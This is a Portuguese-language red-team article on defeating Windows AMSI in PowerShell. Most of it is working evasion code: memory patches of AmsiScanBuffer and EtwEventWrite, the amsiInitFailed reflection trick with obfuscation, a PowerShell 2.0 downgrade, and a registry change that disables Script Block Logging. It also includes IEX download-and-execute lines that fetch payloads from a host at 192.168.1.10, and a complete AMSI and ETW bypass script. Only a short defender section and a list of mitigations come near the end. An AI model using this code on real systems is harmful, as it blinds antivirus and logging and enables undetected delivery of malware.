---
title: "AMSI Bypass — Desabilitando o Antimalware Scan Interface no PowerShell"
date: 2025-02-10
description: "Técnicas para contornar o AMSI (Antimalware Scan Interface) do Windows e executar payloads PowerShell sem detecção por soluções AV/EDR."
category: evasion
os: [windows]
difficulty: hard
mitre_tactic: TA0005
mitre_technique: T1562.001
tags: [amsi, powershell, evasion, windows, av-bypass, reflection, patching]
status: published
readingTime: 12
---

## O que é AMSI?

O **AMSI (Antimalware Scan Interface)** é uma API do Windows introduzida no Windows 10 que permite que aplicações enviem conteúdo para soluções antivírus escanearem **em tempo real**, antes da execução.

O fluxo funciona assim:

1. PowerShell recebe um script ou comando
2. Antes de executar, chama `AmsiScanBuffer()` ou `AmsiScanString()` via `amsi.dll`
3. O AV/EDR registrado escaneia o conteúdo
4. Se malicioso → bloqueado. Se limpo → execução prossegue

```
PowerShell → amsi.dll → AmsiScanBuffer() → AV Provider → Allow / Block
```

Toda sessão do PowerShell carrega a `amsi.dll` no processo. O objetivo dos bypasses é neutralizar essa DLL **antes** de executar payloads ofensivos.

> **AVISO:** Estas técnicas são para uso exclusivo em ambientes autorizados (pentest, red team, laboratório). O uso não autorizado é crime.

## Técnica 1 — Patch de AmsiScanBuffer via Reflection

A técnica mais clássica: usar .NET Reflection para localizar e patchear a função `AmsiScanBuffer` na memória, fazendo-a sempre retornar `AMSI_RESULT_CLEAN`.

```powershell
# AMSI Patch via Reflection — clássico
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

$Lib  = [Win32]::LoadLibrary("amsi.dll")
$Addr = [Win32]::GetProcAddress($Lib, "AmsiScanBuffer")

# Patch: mov eax, 0x80070057 ; ret
$Patch = [Byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
$Old   = 0

[Win32]::VirtualProtect($Addr, [UIntPtr]5, 0x40, [ref]$Old) | Out-Null

$Marshal = [System.Runtime.InteropServices.Marshal]
$Marshal::Copy($Patch, 0, $Addr, 6)
```

Após executar isso na sessão, o AMSI está neutralizado para o processo atual.

## Técnica 2 — Forçar Erro via AmsiInitFailed

Uma abordagem mais furtiva: usar Reflection para setar o campo privado `amsiInitFailed` no contexto da sessão atual, fazendo o PowerShell acreditar que o AMSI falhou ao inicializar.

```powershell
# AmsiInitFailed — forçar falha de inicialização
$a = [Ref].Assembly.GetTypes() | Where-Object {
    $_.Name -like '*Am*i*'
}

$b = $a | ForEach-Object {
    $_.GetFields('NonPublic,Static') | Where-Object {
        $_.Name -like '*ailed*'
    }
}

$b.SetValue($null, $true)
```

Este método é frequentemente detectado por EDRs modernos pois a string `amsiInitFailed` virou uma assinatura. Use obfuscação:

```powershell
# Versão obfuscada com concatenação de strings
$x = 'Am' + 'si' + 'Utils'
$y = 'am' + 'si' + 'Init' + 'Failed'

$t = [Ref].Assembly.GetType("System.Management.Automation.$x")
$f = $t.GetField($y, 'NonPublic,Static')
$f.SetValue($null, $true)
```

## Técnica 3 — Patch com Marshal.WriteInt32

Variação do patch direto, usando `Marshal.WriteInt32` sem precisar de P/Invoke custom:

```powershell
# Bypass via Marshal sem Add-Type
$a = [System.Runtime.InteropServices.Marshal]
$b = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$c = $b.GetField('amsiContext', 'NonPublic,Static')
$d = $c.GetValue($null)

# Corrompe o contexto AMSI
$a::WriteInt32([IntPtr]($d.ToInt64() + 0x8), 0)
```

## Técnica 4 — Downgrade para PowerShell 2.0

O PowerShell 2.0 não implementa AMSI. Se ainda estiver instalado no sistema:

```powershell
# Verifica se PS 2.0 está disponível
powershell -version 2 -Command "$PSVersionTable"

# Executa payload no contexto PS 2.0 (sem AMSI)
powershell -version 2 -ExecutionPolicy Bypass -File payload.ps1
```

```powershell
# Verifica instalação do .NET 2.0/3.5 (necessário para PS 2.0)
Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root
```

> **Nota:** Muitos ambientes modernos têm PS 2.0 desabilitado via GPO. Verifique antes de tentar.

## Técnica 5 — Obfuscação de Strings (Evasão de Assinaturas)

Em vez de patchear AMSI, evite ativá-lo. Strings conhecidas como `amsiInitFailed`, `AmsiScanBuffer`, `Invoke-Mimikatz` ativam assinaturas. Use obfuscação:

```powershell
# Concatenação simples
$cmd = 'Invoke' + '-' + 'Mi' + 'mi' + 'katz'
IEX $cmd

# Base64 encoding
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Invoke-Mimikatz'))
IEX ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)))

# SecureString (menos comum mas eficaz)
$s = 'amsiInitFailed'
$secure = ConvertTo-SecureString $s -AsPlainText -Force
$plain  = [Runtime.InteropServices.Marshal]::PtrToStringAuto(
    [Runtime.InteropServices.Marshal]::SecureStringToBSTR($secure)
)
```

## Técnica 6 — Carregamento via WebRequest (In-Memory)

Carregar payloads diretamente na memória sem tocar o disco, minimizando surface de detecção:

```powershell
# Bypass + carregamento in-memory
# 1. Disable AMSI primeiro
# 2. Carrega assembly remoto sem escritar em disco

IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.10/bypass.ps1')

# Ou via IWR
$r = Invoke-WebRequest -Uri 'http://192.168.1.10/payload.ps1' -UseBasicParsing
IEX $r.Content

# Assembly .NET em memória
$bytes = (New-Object Net.WebClient).DownloadData('http://192.168.1.10/tool.dll')
[Reflection.Assembly]::Load($bytes)
```

## Detecção e Contornos de EDR

EDRs modernos monitoram além do AMSI:

| Vetor de Detecção | Técnica de Evasão |
|---|---|
| Assinaturas de string | Obfuscação, encoding, concatenação |
| Script Block Logging | Patchear `ScriptBlockLoggingEnabled` via registro |
| ETW (Event Tracing) | Patchear `EtwEventWrite` em `ntdll.dll` |
| Constrained Language Mode | Bypass via COM, `Add-Type`, runspaces |
| WLDP (WDAC) | Técnicas mais avançadas de process injection |

```powershell
# Desabilitar Script Block Logging (requer permissão ou bypass de CLM)
$key = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'
Set-ItemProperty -Path $key -Name 'EnableScriptBlockLogging' -Value 0
```

## Script Completo: AMSI + ETW Bypass

```powershell
#!/usr/bin/env pwsh
# amsi_etw_bypass.ps1 — AMSI + ETW neutralization
# Uso: . .\amsi_etw_bypass.ps1

function Invoke-AmsiBypass {
    try {
        $a = [Ref].Assembly.GetType(
            'System.Management.Automation.' + 'Am' + 'siUtils'
        )
        $b = $a.GetField('am' + 'siInit' + 'Failed', 'NonPublic,Static')
        $b.SetValue($null, $true)
        Write-Host "[+] AMSI     : disabled" -ForegroundColor Green
    } catch {
        Write-Host "[-] AMSI bypass failed: $_" -ForegroundColor Red
    }
}

function Invoke-ETWBypass {
    try {
        $patch = [Byte[]](0xC3) # ret
        $addr  = [System.Diagnostics.Eventing.EventProvider].GetField(
            'm_etwCallback',
            'NonPublic,Instance'
        )
        
        # P/Invoke para VirtualProtect + patch EtwEventWrite
        $ntdll    = [System.Runtime.InteropServices.Marshal]
        $kernel32 = Add-Type -MemberDefinition @'
[DllImport("kernel32.dll")]
public static extern bool VirtualProtect(
    IntPtr lpAddress, UIntPtr dwSize,
    uint flNewProtect, out uint lpflOldProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr GetProcAddress(IntPtr h, string name);
[DllImport("kernel32.dll")]
public static extern IntPtr LoadLibrary(string name);
'@ -Name 'K32' -PassThru

        $lib  = $kernel32::LoadLibrary("ntdll.dll")
        $func = $kernel32::GetProcAddress($lib, "EtwEventWrite")
        $old  = [uint32]0
        $kernel32::VirtualProtect($func, [UIntPtr]1, 0x40, [ref]$old) | Out-Null
        [System.Runtime.InteropServices.Marshal]::WriteByte($func, 0xC3)
        
        Write-Host "[+] ETW      : patched" -ForegroundColor Green
    } catch {
        Write-Host "[!] ETW bypass skipped: $_" -ForegroundColor Yellow
    }
}

Invoke-AmsiBypass
Invoke-ETWBypass
Write-Host "[*] Session ready. OPSEC level: reduced." -ForegroundColor Cyan
```

## Detecção pelo Lado do Defensor

Se você é o Blue Team, monitore:

- **Event ID 4104** — Script Block Logging (PowerShell)
- **Event ID 4688** — Process creation com `powershell.exe -version 2`
- **Sysmon Event 10** — Process access a `amsi.dll`
- Carregamento de `System.Management.Automation` via Reflection
- Presença de strings como `AmsiScanBuffer`, `amsiInitFailed`, `VirtualProtect` em logs

```powershell
# Blue Team: verificar se AMSI está ativo na sessão
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    .GetField('amsiInitFailed','NonPublic,Static')
    .GetValue($null)
# $false = AMSI ativo | $true = AMSI comprometido
```

## Mitigações

- Habilitar **PowerShell Constrained Language Mode** via WDAC/AppLocker
- Desabilitar **PowerShell 2.0** (`Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root`)
- Habilitar **Script Block Logging** e **Module Logging** (GPO)
- Usar **EDR com proteção de memória** (CrowdStrike, SentinelOne, Microsoft Defender for Endpoint)
- Monitorar **ETW providers** para PowerShell: `Microsoft-Windows-PowerShell`
- Implementar **JEA (Just Enough Administration)** para restringir comandos disponíveis

## Referências

- [AMSI — Microsoft Docs](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)
- [S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
- MITRE ATT&CK: [T1562.001 — Impair Defenses: Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/)